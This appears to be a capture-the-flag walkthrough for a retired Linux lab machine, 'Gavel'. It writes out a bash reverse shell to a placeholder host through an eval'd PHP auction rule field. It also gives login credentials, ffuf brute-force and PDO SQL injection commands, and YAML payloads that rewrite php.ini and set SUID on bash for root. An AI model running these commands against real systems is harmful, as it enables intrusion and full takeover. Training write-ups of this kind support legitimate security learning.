# Gavel

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--11--29-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | November 29, 2025 |
| **Rating** | 3.6 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

An exposed `.git` directory hands over the application source, which reveals two separate paths. The intended one is a PDO SQL injection in `inventory.php`; the faster one is a rule-injection bug in `admin.php`, where an auction `rule` field is `eval`'d as PHP when a bid is placed — straight RCE with weak `auctioneer` credentials that are also brute-forceable. Root abuses `gavel-util`, a group-permitted binary that executes PHP from the `rule:` field of a submitted YAML file under a restricted `php.ini`; since that `php.ini` is itself writable through the same primitive, the first payload clears `disable_functions` and the second sets SUID on bash.

---

## Quick Reference - Full Attack Chain

```bash
# 1. Add to hosts
echo "10.129.x.x gavel.htb" | sudo tee -a /etc/hosts

# 2. Login as auctioneer and inject reverse shell
rm -f cookies.txt && curl -c cookies.txt -X POST http://gavel.htb/login.php \
  -d "username=auctioneer&password=midnight1" -s -o /dev/null && \
curl -b cookies.txt -X POST http://gavel.htb/admin.php \
  -d "auction_id=82&rule=system('bash -c \"bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261\"'); return true;&message=pwned" -s -o /dev/null && \
curl -b cookies.txt -X POST http://gavel.htb/includes/bid_handler.php \
  -d "auction_id=82&bid_amount=99999"

# 3. In reverse shell: su auctioneer (password: midnight1)
# 4. cat ~/user.txt

# 5. Privesc - create and submit YAML files
# 6. /bin/bash -p -c 'cat /root/root.txt'
```

---

## Phase 1: Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -p- --min-rate 5000 10.129.x.x
```

**Key Findings:**
- Port 22: SSH
- Port 80: Apache with **exposed .git directory**

### Git Dump (Optional - for understanding)
```bash
pip install git-dumper --break-system-packages
git-dumper http://gavel.htb/.git/ gavel-git
```

Source code reveals:
- PDO SQL injection in `inventory.php` (intended path)
- Rule injection in `admin.php` (our path)
- DB creds: `gavel:gavel` (not needed)

---

## Phase 2: Initial Access

### Known Credentials (Unintended Path - Faster!)
```
auctioneer:midnight1
```

> **Note:** These can be brute-forced with ffuf against login.php using rockyou top 10k or darkweb2017_top-1000.txt

### Login and Access Admin Panel
```bash
rm -f cookies.txt && curl -c cookies.txt -X POST http://gavel.htb/login.php \
  -d "username=auctioneer&password=midnight1" -s -o /dev/null
```

### Inject Reverse Shell via Rule Parameter

**Start listener:**
```bash
nc -lvnp 4444
```

**Inject payload and trigger:**
```bash
# Inject the reverse shell into rule
curl -b cookies.txt -X POST http://gavel.htb/admin.php \
  -d "auction_id=82&rule=system('bash -c \"bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261\"'); return true;&message=pwned" -s -o /dev/null

# Trigger execution by placing a bid
curl -b cookies.txt -X POST http://gavel.htb/includes/bid_handler.php \
  -d "auction_id=82&bid_amount=99999" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### Upgrade Shell and Switch User
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
su auctioneer
# Password: midnight1
```

### Get User Flag
```bash
cat ~/user.txt
```

The user flag is in `~/user.txt`.

---

## Phase 3: Privilege Escalation

### Discovery
The `auctioneer` user belongs to `gavel-seller` group which has access to `/usr/local/bin/gavel-util`.

This binary processes YAML files and executes PHP code in the `rule:` field via `/opt/gavel/gaveld`.

The PHP execution uses a restricted `php.ini` at `/opt/gavel/.config/php/php.ini` with `disable_functions` set.

### Step 1: Overwrite php.ini to Remove Restrictions

```bash
cd /tmp && mkdir pwn && cd pwn

cat << 'EOF' > ini_overwrite.yaml
name: IniOverwrite
description: Removing restrictions
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Config Pwned"
rule: |
  file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=/\ndisable_functions=\n");
  return false;
EOF

/usr/local/bin/gavel-util submit ini_overwrite.yaml
```

### Step 2: Set SUID on /bin/bash

```bash
cat << 'EOF' > root_suid.yaml
name: RootSuid
description: Getting Root
image: "data:image/png;base64,AA=="
price: 1337
rule_msg: "Shell Pwned"
rule: |
  system("chmod u+s /bin/bash");
  return false;
EOF

/usr/local/bin/gavel-util submit root_suid.yaml
```

### Step 3: Verify and Get Root

```bash
ls -la /bin/bash
# Should show: -rwsr-xr-x 1 root root ... /bin/bash

/bin/bash -p -c 'cat /root/root.txt'
```


---

## Alternative Paths

### SQLi Path (Intended - Slower)
The `inventory.php` has a PDO SQL injection vulnerability:

```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`x`+FROM+users)y;--+-&sort=?
```

Reference: [PHP PDO SQL Injection Research](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)

This dumps user hashes which can be cracked with john:
```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Brute Force Path
```bash
ffuf -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt \
  -u http://gavel.htb/login.php -X POST \
  -d "username=auctioneer&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid username or password" -mc 302 -rate 100
```

---

## Key Lessons Learned

1. **Check for .git exposure** - Quick source code review reveals attack surface

2. **Admin credentials are often weak** - `auctioneer:midnight1` was brute-forceable

3. **Rule engines = Code execution** - Any "rule" or "expression" field that gets evaluated is a potential RCE vector

4. **YAML injection** - When binaries process YAML with code execution, look for ways to inject malicious payloads

5. **php.ini restrictions can be bypassed** - If you can write to php.ini, you can remove `disable_functions`

6. **Trigger conditions matter** - The RCE payload needed a bid to be placed to actually execute

---

## Tools Used
- nmap
- git-dumper
- curl
- nc (netcat)
- ffuf (for brute force)

---

## Timeline
- Recon: 2 minutes
- User: 5 minutes  
- Root: 3 minutes
- **Total: ~10 minutes**

---

## References
- [PHP PDO SQL Injection](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)
- [PHP disable_functions bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass)

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
